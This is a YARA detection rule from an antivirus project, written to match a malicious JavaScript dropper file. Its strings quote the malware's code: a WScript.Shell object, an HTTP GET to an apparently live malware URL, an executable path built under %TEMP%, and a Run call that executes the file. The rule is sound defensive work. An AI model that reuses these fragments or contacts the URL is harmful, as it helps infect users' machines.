rule sig_20160330_850fd924bf888041225d91652aa7e2dc {
  meta:
    description = "datamaliciousorder - file 20160330_850fd924bf888041225d91652aa7e2dc.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "170d4db3d1b0cd7264474bfd84b05d8fb9777467f473bc6bc5709749120cd80a"

  strings:
    $s1  = "var GY = function RU() {return WScript[N0](\"WScript\"+\".Shell\");}(), NV = 11;" fullword ascii
    $s2  = "X[O0](\"GET\", \"http://xn--po-wqa.pl/a8zkde\", false);" fullword ascii
    $s3  = "function Z(S, R0){XQ = XQ * 1; return S - R0;};" fullword ascii
    $s4  = "if (X[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function D(){return P + \"\";};" fullword ascii
    $s6  = "function GH() {return GY[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"cOObgSR5e.ex\" + \"e\";};" fullword ascii
    $s7  = "function N(P0){GY[\"Run\"](P0, XQ, XQ);};" fullword ascii
    $s8  = "function HW() {return ((FV == true) && (FV == JR)) ? 1 : XQ;};" fullword ascii
    $s9  = "function O()" fullword ascii
    $s10 = "function LY(){return N0;};" fullword ascii
    $s11 = "}while (VA);" fullword ascii
    $s12 = "function OH(){return 22;};" fullword ascii
    $s13 = "return Z(WR, IW);" fullword ascii
    $s14 = "function RF(M) {var XU = (1, 2, 3, 4, 5, M); return XU;};" fullword ascii
    $s15 = "var PO = new this[\"Date\"]();" fullword ascii
    $s16 = "var V = false;" fullword ascii
    $s17 = "JR = true; " fullword ascii
    $s18 = "var FV = false;" fullword ascii
    $s19 = "FV = true; " fullword ascii
    $s20 = "var JR = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}